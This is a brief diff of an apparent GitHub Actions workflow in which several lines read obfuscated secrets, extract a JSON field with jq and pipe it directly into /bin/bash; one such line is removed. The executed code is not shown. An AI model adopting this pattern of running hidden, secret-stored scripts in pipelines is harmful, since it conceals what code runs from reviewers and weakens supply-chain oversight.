@@ -22,7 +22,6 @@ jobs:
           do557: ${{ secrets.do557 }}
         run: |
           printf '%s' "$do557" | jq -r .dhjo3317 | /bin/bash
-          echo $ygxtd41999 | jq -r .zkcgk04421 | /bin/bash
           printf '%s' "$bvd10642" | jq -r .xl06 | /bin/bash
           printf '%s' "$gh16" | jq -r .vz6 | /bin/bash
 
